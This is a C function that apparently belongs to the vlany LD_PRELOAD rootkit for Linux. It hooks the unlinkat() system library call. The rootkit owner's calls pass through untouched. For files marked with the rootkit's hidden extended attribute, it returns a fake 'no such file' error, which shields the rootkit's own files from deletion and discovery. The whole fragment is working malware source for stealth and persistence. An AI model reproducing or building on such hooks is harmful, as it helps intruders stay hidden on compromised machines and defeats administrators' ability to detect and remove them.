int unlinkat(int dirfd, const char *pathname, int flags)
{
    #ifdef DEBUG
        printf("[vlany] unlinkat() called\n");
    #endif

    HOOK(old_unlinkat, CUNLINKAT);

    if(owned()) return old_unlinkat(dirfd, pathname, flags);

    if(hidden_xattr(pathname) || hidden_fxattr(dirfd)) { errno = ENOENT; return -1; }

    return old_unlinkat(dirfd, pathname, flags);
}
